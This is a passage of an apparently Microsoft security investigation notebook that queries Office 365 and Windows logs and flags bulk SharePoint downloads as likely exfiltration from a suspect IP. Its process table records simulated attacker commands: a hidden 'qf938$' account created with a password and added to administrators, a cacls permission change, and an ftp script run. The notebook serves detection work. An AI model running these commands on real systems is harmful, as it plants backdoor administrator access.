gFKHRo92QgAAFIdGj3ZCAIDVhkaPdkIAgFiGRo92QgAAGoZGj3ZCAACdhUaPdkIAAJ2FRo92QgAAIIVGj3ZCAACjhEaPdkIAgGSERo92QgAAJoRGj3ZCAAAmhEaPdkIAgOeDRo92QgCAaoNGj3ZCAACvgkaPdkIAAAiJRo92QgAACIlGj3ZCAACLiEaPdkIAAA6IRo92QgAAkYdGj3ZCAACRh0aPdkIAgFKHRo92QgAAFIdGj3ZCAIDVhkaPdkIAAJeGRo92QgCAWIZGj3ZCAIDbhUaPdkIAAJ2FRo92QgCAXoVGj3ZCAIDhhEaPdkIAgGSERo92QgCAZIRGj3ZCAAAmhEaPdkIAgOeDRo92QgAAqYNGj3ZCAAAsg0aPdkIAAK+CRo92Qg==\",\"dtype\":\"float64\",\"shape\":[47]},\"UserId\":[\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\",\"ianh@m365x054215.onmicrosoft.com\"],\"index\":[21,22,23,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73],\"y_index\":[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]},\"selected\":{\"id\":\"1501\",\"type\":\"Selection\"},\"selection_policy\":{\"id\":\"1500\",\"type\":\"UnionRenderers\"}},\"id\":\"1476\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"axis_label\":\"Event Time\",\"formatter\":{\"id\":\"1469\",\"type\":\"DatetimeTickFormatter\"},\"plot\":{\"id\":\"1437\",\"subtype\":\"Figure\",\"type\":\"Plot\"},\"ticker\":{\"id\":\"1448\",\"type\":\"DatetimeTicker\"}},\"id\":\"1447\",\"type\":\"DatetimeAxis\"}],\"root_ids\":[\"1437\"]},\"title\":\"Bokeh Application\",\"version\":\"1.0.4\"}};\n",
       "  var render_items = [{\"docid\":\"58b77eef-08d1-46c9-8180-61c5da375b70\",\"roots\":{\"1437\":\"375054ca-93c8-4db5-8799-e4444ec34f98\"}}];\n",
       "  root.Bokeh.embed.embed_items_notebook(docs_json, render_items);\n",
       "\n",
       "  }\n",
       "  if (root.Bokeh !== undefined) {\n",
       "    embed_document(root);\n",
       "  } else {\n",
       "    var attempts = 0;\n",
       "    var timer = setInterval(function(root) {\n",
       "      if (root.Bokeh !== undefined) {\n",
       "        embed_document(root);\n",
       "        clearInterval(timer);\n",
       "      }\n",
       "      attempts++;\n",
       "      if (attempts > 100) {\n",
       "        console.log(\"Bokeh: ERROR: Unable to run BokehJS code because BokehJS library is missing\");\n",
       "        clearInterval(timer);\n",
       "      }\n",
       "    }, 10, root)\n",
       "  }\n",
       "})(window);"
      ],
      "application/vnd.bokehjs_exec.v0+json": ""
     },
     "metadata": {
      "application/vnd.bokehjs_exec.v0+json": {
       "id": "1437"
      }
     },
     "output_type": "display_data"
    },
    {
     "data": {
      "text/markdown": [
       "### Evidence of automated or bulk uploads/downloads"
      ],
      "text/plain": [
       "<IPython.core.display.Markdown object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "      <th>Operation Count</th>\n",
       "      <th>OpsPerSec</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>UserId</th>\n",
       "      <th>ClientIP</th>\n",
       "      <th>RecordType</th>\n",
       "      <th>Operation</th>\n",
       "      <th>TimeGenerated</th>\n",
       "      <th></th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th rowspan=\"2\" valign=\"top\">ianh@m365x054215.onmicrosoft.com</th>\n",
       "      <th rowspan=\"2\" valign=\"top\">23.97.60.214</th>\n",
       "      <th rowspan=\"2\" valign=\"top\">SharePointFileOperation</th>\n",
       "      <th rowspan=\"2\" valign=\"top\">FileDownloaded</th>\n",
       "      <th>2019-02-16 03:45:00</th>\n",
       "      <td>17</td>\n",
       "      <td>1.7</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2019-02-16 03:45:10</th>\n",
       "      <td>17</td>\n",
       "      <td>1.7</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                                                                          Operation Count  \\\n",
       "UserId                           ClientIP     RecordType              Operation      TimeGenerated                          \n",
       "ianh@m365x054215.onmicrosoft.com 23.97.60.214 SharePointFileOperation FileDownloaded 2019-02-16 03:45:00               17   \n",
       "                                                                                     2019-02-16 03:45:10               17   \n",
       "\n",
       "                                                                                                          OpsPerSec  \n",
       "UserId                           ClientIP     RecordType              Operation      TimeGenerated                   \n",
       "ianh@m365x054215.onmicrosoft.com 23.97.60.214 SharePointFileOperation FileDownloaded 2019-02-16 03:45:00        1.7  \n",
       "                                                                                     2019-02-16 03:45:10        1.7  "
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "o365_start = security_alert.origin_time - timedelta(seconds=(60 * 60))\n",
    "o365_end = security_alert.origin_time + timedelta(seconds=(10 * 60 * 60))\n",
    "\n",
    "print('Running queries...', end=' ')\n",
    "# Queries\n",
    "ad_changes_query = '''\n",
    "OfficeActivity\n",
    "| where TimeGenerated >= datetime({start})\n",
    "| where TimeGenerated <= datetime({end})\n",
    "| where RecordType == 'AzureActiveDirectory'\n",
    "| where Operation in ('Add service principal.',\n",
    "                      'Change user password.', \n",
    "                      'Add user.', \n",
    "                      'Add member to role.')\n",
    "| where UserType == 'Regular' \n",
    "| project OfficeId, TimeGenerated, Operation, OrganizationId, \n",
    "          OfficeWorkload, ResultStatus, OfficeObjectId, \n",
    "          UserId = tolower(UserId), ClientIP, ExtendedProperties\n",
    "'''.format(start = o365_start, end=o365_end)\n",
    "%kql -query ad_changes_query\n",
    "ad_changes_df = _kql_raw_result_.to_dataframe()\n",
    "\n",
    "\n",
    "office_ops_query = '''\n",
    "OfficeActivity\n",
    "| where TimeGenerated >= datetime({start})\n",
    "| where TimeGenerated <= datetime({end})\n",
    "| where RecordType in (\"AzureActiveDirectoryAccountLogon\", \"AzureActiveDirectoryStsLogon\")\n",
    "| extend UserAgent = extractjson(\"$[0].Value\", ExtendedProperties, typeof(string))\n",
    "| union (\n",
    "    OfficeActivity \n",
    "    | where TimeGenerated >= datetime({start})\n",
    "    | where TimeGenerated <= datetime({end})\n",
    "    | where RecordType !in (\"AzureActiveDirectoryAccountLogon\", \"AzureActiveDirectoryStsLogon\")\n",
    ")\n",
    "| where UserType == 'Regular'\n",
    "'''.format(start = o365_start, end=o365_end)\n",
    "%kql -query office_ops_query\n",
    "office_ops_df = _kql_raw_result_.to_dataframe()\n",
    "\n",
    "office_ops_summary_query = '''\n",
    "let timeRange=ago(30d);\n",
    "let officeAuthentications = OfficeActivity\n",
    "| where TimeGenerated >= timeRange\n",
    "| where RecordType in (\"AzureActiveDirectoryAccountLogon\", \"AzureActiveDirectoryStsLogon\")\n",
    "| extend UserAgent = extractjson(\"$[0].Value\", ExtendedProperties, typeof(string))\n",
    "| where Operation == \"UserLoggedIn\";\n",
    "officeAuthentications\n",
    "| union (\n",
    "    OfficeActivity \n",
    "    | where TimeGenerated >= timeRange\n",
    "    | where RecordType !in (\"AzureActiveDirectoryAccountLogon\", \"AzureActiveDirectoryStsLogon\")\n",
    ")\n",
    "| where UserType == 'Regular'\n",
    "| extend RecordOp = strcat(RecordType, '-', Operation)\n",
    "| summarize OpCount=count() by RecordType, Operation, UserId, UserAgent, ClientIP, bin(TimeGenerated, 1h)\n",
    "// render timeline\n",
    "'''.format(start = o365_start, end=o365_end)\n",
    "%kql -query office_ops_summary_query\n",
    "office_ops_summary_df = _kql_raw_result_.to_dataframe()\n",
    "# %kql -query office_ops_query\n",
    "# office_ops_df = _kql_raw_result_.to_dataframe()\n",
    "\n",
    "# office_logons_query = '''\n",
    "# let timeRange=ago(30d);\n",
    "# let officeAuthentications = OfficeActivity\n",
    "# | where TimeGenerated >= timeRange\n",
    "# | where RecordType in (\"AzureActiveDirectoryAccountLogon\", \"AzureActiveDirectoryStsLogon\")\n",
    "# | extend UserAgent = extractjson(\"$[0].Value\", ExtendedProperties, typeof(string))\n",
    "# | where Operation == \"UserLoggedIn\";\n",
    "# let lookupWindow = 1d;\n",
    "# let lookupBin = lookupWindow / 2.0; \n",
    "# officeAuthentications | project-rename Start=TimeGenerated\n",
    "# | extend TimeKey = bin(Start, lookupBin)\n",
    "# | join kind = inner (\n",
    "#     officeAuthentications\n",
    "#     | project-rename End=TimeGenerated\n",
    "#     | extend TimeKey = range(bin(End - lookupWindow, lookupBin), bin(End, lookupBin), lookupBin)\n",
    "#     | mvexpand TimeKey to typeof(datetime)\n",
    "# ) on UserAgent, TimeKey\n",
    "# | project timeSpan = End - Start, UserId, ClientIP , UserAgent , Start, End\n",
    "# | summarize dcount(ClientIP) by  UserAgent\n",
    "# | where dcount_ClientIP > 1\n",
    "# | join kind=inner (  \n",
    "# officeAuthentications\n",
    "# | summarize minTime=min(TimeGenerated), maxTime=max(TimeGenerated) by UserId, UserAgent, ClientIP\n",
    "# ) on UserAgent\n",
    "# '''\n",
    "# %kql -query office_logons_query\n",
    "# office_logons_df = _kql_raw_result_.to_dataframe()\n",
    "\n",
    "print('done.')\n",
    "\n",
    "# Any IP Addresses in our alert IPs that match?\n",
    "display(Markdown('### Any IP Addresses in our alert IPs that match Office Activity?'))\n",
    "\n",
    "for ip in alert_ip_entities:\n",
    "    susp_o365_activities = office_ops_df[office_ops_df['ClientIP'] == ip.Address]\n",
    "    susp_o365_summ = (office_ops_df[office_ops_df['ClientIP'] == ip.Address]\n",
    "                         [['OfficeId', 'UserId', 'RecordType', 'Operation']]\n",
    "                         .groupby(['UserId', 'RecordType', 'Operation']).count()\n",
    "                         .rename(columns={'OfficeId': 'OperationCount'}))\n",
    "    \n",
    "    display(Markdown(f'### Activity for {ip.Address}'))\n",
    "    if len(susp_o365_summ) > 0:\n",
    "        display(susp_o365_summ)\n",
    "        add_observation(Observation(caption=f'O365 activity from suspected attacker IP {ip.Address}',\n",
    "                                    description=f'Summarized operation count for each user/service/operation type',\n",
    "                                    item=susp_o365_summ,\n",
    "                                    link='o365_match_ip'))\n",
    "    else:\n",
    "        display(Markdown('No activity detected'))\n",
    "\n",
    "\n",
    "for susp_ip in [ip.Address for ip in alert_ip_entities]:\n",
    "\n",
    "    suspect_ip_ops = office_ops_df[office_ops_df['ClientIP'] == susp_ip]\n",
    "    \n",
    "    display(Markdown(f'### Timeline of operations originating from suspect IP Address: {susp_ip}'))\n",
    "    display(Markdown(f'**{susp_ip}**'))\n",
    "    if len(suspect_ip_ops) == 0:\n",
    "        display(Markdown('No activity detected'))\n",
    "        continue\n",
    "    sel_op_type='FileDownloaded'\n",
    "    nbdisp.display_timeline(data=suspect_ip_ops, title=f'Operations from {susp_ip} (all=blue, {sel_op_type}=green)',\n",
    "                            overlay_data=suspect_ip_ops.query('Operation == @sel_op_type'),\n",
    "                            height=200,\n",
    "                            source_columns=['UserId', 'RecordType', 'Operation'])\n",
    "    \n",
    "    # Uncomment line below to see all activity\n",
    "    # display(suspect_ip_ops.sort_values('TimeGenerated', ascending=True).head())\n",
    "\n",
    "\n",
    "display(Markdown('### Evidence of automated or bulk uploads/downloads'))\n",
    "\n",
    "timed_slice_ops = office_ops_df[['RecordType', 'TimeGenerated', 'Operation',\n",
    "       'OrganizationId', 'UserType', 'OfficeWorkload',\n",
    "       'ResultStatus', 'OfficeObjectId', 'UserId', 'ClientIP', 'Start_Time']]\n",
    "timed_slice_ops2 = timed_slice_ops.set_index('TimeGenerated')\n",
    "\n",
    "hi_freq_ops = (timed_slice_ops2[['UserId', 'ClientIP', 'Operation', 'RecordType']]\n",
    "                .groupby(['UserId', 'ClientIP', 'RecordType', 'Operation']).resample('10S').count()\n",
    "                .query('RecordType > 10')\n",
    "                .drop(['ClientIP', 'UserId', 'RecordType'], axis=1)\n",
    "                .assign(OpsPerSec = lambda x: x.Operation / 10)\n",
    "                .rename(columns={'Operation': 'Operation Count'}))\n",
    "\n",
    "if len(hi_freq_ops) > 0:\n",
    "    display(hi_freq_ops)\n",
    "    add_observation(Observation(caption=f'O365 bulk/high freq operations seen',\n",
    "                                    description=f'Summarized operation count bulk actions',\n",
    "                                    item=hi_freq_ops,\n",
    "                                    link='o356_high_freq'))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Observations\n",
    "- Logon failures and success originating from our attacker IP Address\n",
    "- File download activity\n",
    "- We also confirm what looks like data exfiltration with another check that looks for high frequency operations for a given user/IP"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "<a id='appendices'></a>[Contents](#toc)\n",
    "# Appendices"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Available DataFrames"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "print('List of current DataFrames in Notebook')\n",
    "print('-' * 50)\n",
    "current_vars = list(locals().keys())\n",
    "for var_name in current_vars:\n",
    "    if isinstance(locals()[var_name], pd.DataFrame) and not var_name.startswith('_'):\n",
    "        print(var_name)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "tags": [
     "todo"
    ]
   },
   "source": [
    "## Saving Data to Excel\n",
    "To save the contents of a pandas DataFrame to an Excel spreadsheet\n",
    "use the following syntax\n",
    "```\n",
    "writer = pd.ExcelWriter('myWorksheet.xlsx')\n",
    "my_data_frame.to_excel(writer,'Sheet1')\n",
    "writer.save()\n",
    "```"
   ]
  }
 ],
 "metadata": {
  "hide_input": false,
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {
    "height": "318.996px",
    "width": "320.994px"
   },
   "number_sections": false,
   "sideBar": true,
   "skip_h1_title": false,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {
    "height": "calc(100% - 180px)",
    "left": "10px",
    "top": "150px",
    "width": "270px"
   },
   "toc_section_display": true,
   "toc_window_display": false
  },
  "varInspector": {
   "cols": {
    "lenName": 16,
    "lenType": 16,
    "lenVar": 40
   },
   "kernels_config": {
    "python": {
     "delete_cmd_postfix": "",
     "delete_cmd_prefix": "del ",
     "library": "var_list.py",
     "varRefreshCmd": "print(var_dic_list())"
    },
    "r": {
     "delete_cmd_postfix": ") ",
     "delete_cmd_prefix": "rm(",
     "library": "var_list.r",
     "varRefreshCmd": "cat(var_dic_list()) "
    }
   },
   "position": {
    "height": "406.193px",
    "left": "1468.4px",
    "right": "20px",
    "top": "120px",
    "width": "456.572px"
   },
   "types_to_exclude": [
    "module",
    "function",
    "builtin_function_or_method",
    "instance",
    "_Feature"
   ],
   "window_display": false
  },
  "widgets": {
   "application/vnd.jupyter.widget-state+json": {
    "state": {
     "003d026b005741d8ab05f61f770304fa": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "03cc127f25c34f9486916954b540c9cd": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "084c38dd6bf64a17a7d9ef7dc2eafbdc": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "0a20855865a04cf4aed282b4e2c6edf9": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_7937726ea1524135916497fccf746586",
        "IPY_MODEL_f529cdc0164e474885fb72704a7e72aa",
        "IPY_MODEL_3eac9e6184d74823ae1141848404dca0"
       ],
       "layout": "IPY_MODEL_f6cead2f6f174cdda89a078b16ab9bad"
      }
     },
     "0c13059b8c4d4c6cb7de3a9fb3dc04a6": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "0c33633715e94f20a3b7df8acbd4e315": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "0ca0d470a2df4fb68e6b2b1f31b39feb": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HTMLModel",
      "state": {
       "layout": "IPY_MODEL_ebbab620af614bbebfced2e7c3461c56",
       "style": "IPY_MODEL_78f4689da337493aba8d3990753bebee",
       "value": "<h4>Set query time boundaries</h4>"
      }
     },
     "0d1e1b55b3884efc8fed40b2683e84da": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SelectModel",
      "state": {
       "_options_labels": [
        "ian:    (logontype=10)   (timestamp=2019-02-15 19:54:24.590000)    logonid=0x1cfd770",
        "ian:    (logontype=10)   (timestamp=2019-02-15 19:54:24.590000)    logonid=0x1cfd78d",
        "ian:    (logontype=10)   (timestamp=2019-02-16 03:24:49.500000)    logonid=0x25df86b",
        "ian:    (logontype=10)   (timestamp=2019-02-16 03:24:49.500000)    logonid=0x25df888"
       ],
       "description": "Select logon instance to examine",
       "index": 1,
       "layout": "IPY_MODEL_678036be13354ccea16934cafbac1a0e",
       "style": "IPY_MODEL_32075a4cfc084ffbbf20f158b384aa9e"
      }
     },
     "0ddeed6885da4bc29b6bec7e0a5845cd": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "157e267dc37a4c1b9727b3608b362b5a": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "1a90f5957178446fac952202963ea805": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "height": "200px",
       "width": "100%"
      }
     },
     "1e482a4c9d4b4c29a0ba2505a5553467": {
      "model_module": "@jupyter-widgets/output",
      "model_module_version": "1.0.0",
      "model_name": "OutputModel",
      "state": {
       "layout": "IPY_MODEL_60c005a8a0924286b2a7cd06f59457ea",
       "outputs": [
        {
         "data": {
          "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>TenantId</th>\n      <th>Account</th>\n      <th>EventID</th>\n      <th>TimeGenerated</th>\n      <th>SourceComputerId</th>\n      <th>Computer</th>\n      <th>SubjectUserName</th>\n      <th>SubjectDomainName</th>\n      <th>SubjectUserSid</th>\n      <th>TargetUserName</th>\n      <th>TargetDomainName</th>\n      <th>TargetUserSid</th>\n      <th>TargetLogonId</th>\n      <th>LogonProcessName</th>\n      <th>LogonType</th>\n      <th>AuthenticationPackageName</th>\n      <th>Status</th>\n      <th>IpAddress</th>\n      <th>WorkstationName</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>123</th>\n      <td>52b1ab41-869e-4138-9e40-2a4457f09bf0</td>\n      <td>MSTICAlertsWin1\\ian</td>\n      <td>4624</td>\n      <td>2019-02-15 19:54:24.590</td>\n      <td>263a788b-6526-4cdc-8ed9-d79402fe4aa0</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>ian</td>\n      <td>MSTICAlertsWin1</td>\n      <td>S-1-5-21-996632719-2361334927-4038480536-1120</td>\n      <td>0x1cfd78d</td>\n      <td>User32</td>\n      <td>10</td>\n      <td>Negotiate</td>\n      <td></td>\n      <td>13.67.35.176</td>\n      <td>MSTICAlertsWin1</td>\n    </tr>\n  </tbody>\n</table>\n</div>",
          "text/plain": "                                 TenantId              Account  EventID  \\\n123  52b1ab41-869e-4138-9e40-2a4457f09bf0  MSTICAlertsWin1\\ian     4624   \n\n              TimeGenerated                      SourceComputerId  \\\n123 2019-02-15 19:54:24.590  263a788b-6526-4cdc-8ed9-d79402fe4aa0   \n\n            Computer   SubjectUserName SubjectDomainName SubjectUserSid  \\\n123  MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n\n    TargetUserName TargetDomainName  \\\n123            ian  MSTICAlertsWin1   \n\n                                     TargetUserSid TargetLogonId  \\\n123  S-1-5-21-996632719-2361334927-4038480536-1120     0x1cfd78d   \n\n    LogonProcessName  LogonType AuthenticationPackageName Status  \\\n123          User32          10                 Negotiate          \n\n        IpAddress  WorkstationName  \n123  13.67.35.176  MSTICAlertsWin1  "
         },
         "metadata": {},
         "output_type": "display_data"
        },
        {
         "data": {
          "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>NewProcessName</th>\n      <th>CommandLine</th>\n      <th>TargetLogonId</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>282</th>\n      <td>C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --type=utility --field-trial-handl...</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>358</th>\n      <td>C:\\Windows\\System32\\taskhostw.exe</td>\n      <td>taskhostw.exe USER</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>440</th>\n      <td>C:\\Windows\\System32\\AppHostRegistrationVerifier.exe</td>\n      <td>C:\\Windows\\system32\\AppHostRegistrationVerifier.exe</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>454</th>\n      <td>C:\\Windows\\System32\\net.exe</td>\n      <td>net  localgroup administrators abai$ /delete</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>455</th>\n      <td>C:\\Windows\\System32\\net1.exe</td>\n      <td>C:\\Windows\\system32\\net1  localgroup administrators abai$ /delete</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>456</th>\n      <td>C:\\Windows\\System32\\net.exe</td>\n      <td>net  user qf938$ /delete</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>457</th>\n      <td>C:\\Windows\\System32\\net1.exe</td>\n      <td>C:\\Windows\\system32\\net1  user qf938$ /delete</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>458</th>\n      <td>C:\\Windows\\System32\\cmd.exe</td>\n      <td>cmd  /c echo End Security Demo tasks</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>469</th>\n      <td>C:\\Windows\\System32\\TSTheme.exe</td>\n      <td>C:\\Windows\\system32\\TSTheme.exe -Embedding</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>644</th>\n      <td>C:\\Windows\\System32\\rdpclip.exe</td>\n      <td>rdpclip</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>645</th>\n      <td>C:\\Windows\\System32\\AtBroker.exe</td>\n      <td>atbroker.exe</td>\n      <td>0x1cfd78d</td>\n    </tr>\n    <tr>\n      <th>650</th>\n      <td>C:\\Windows\\System32\\cmd.exe</td>\n      <td>cmd  /c echo Any questions about the commands executed here then please contact one of</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>651</th>\n      <td>C:\\Windows\\System32\\cmd.exe</td>\n      <td>cmd  /c echo timb@microsoft.com; ianhelle@microsoft.com; shainw@microsoft.com</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>652</th>\n      <td>C:\\Windows\\System32\\ftp.exe</td>\n      <td>ftp  -s:MG06.dll</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>653</th>\n      <td>C:\\W!ndows\\System32\\cacls.exe</td>\n      <td>cacls.exe  C:\\Windows\\system32\\cscript.exe /e /t /g SYSTEM:F</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>654</th>\n      <td>C:\\Windows\\System32\\net.exe</td>\n      <td>net  users</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>655</th>\n      <td>C:\\Windows\\System32\\findstr.exe</td>\n      <td>findstr  \"qf938$\"</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>656</th>\n      <td>C:\\Windows\\System32\\net1.exe</td>\n      <td>C:\\Windows\\system32\\net1  users</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>657</th>\n      <td>C:\\Windows\\System32\\net.exe</td>\n      <td>net  user qf938$ Wf9k44_9d[=$ /add</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>658</th>\n      <td>C:\\Windows\\System32\\net1.exe</td>\n      <td>C:\\Windows\\system32\\net1  user qf938$ Wf9k44_9d[=$ /add</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>659</th>\n      <td>C:\\Windows\\System32\\net.exe</td>\n      <td>net  user qf938$ Wf9k44_9d[=$</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>660</th>\n      <td>C:\\Windows\\System32\\net1.exe</td>\n      <td>C:\\Windows\\system32\\net1  user qf938$ Wf9k44_9d[=$</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>661</th>\n      <td>C:\\Windows\\System32\\net.exe</td>\n      <td>net  user qf938$ /active:yes</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>662</th>\n      <td>C:\\Windows\\System32\\net1.exe</td>\n      <td>C:\\Windows\\system32\\net1  user qf938$ /active:yes</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>663</th>\n      <td>C:\\Windows\\System32\\net.exe</td>\n      <td>net  localgroup administrators</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>665</th>\n      <td>C:\\Windows\\System32\\net1.exe</td>\n      <td>C:\\Windows\\system32\\net1  localgroup administrators</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>666</th>\n      <td>C:\\Windows\\System32\\net.exe</td>\n      <td>net  localgroup administrators qf938$ /add</td>\n      <td>0x0</td>\n    </tr>\n    <tr>\n      <th>667</th>\n    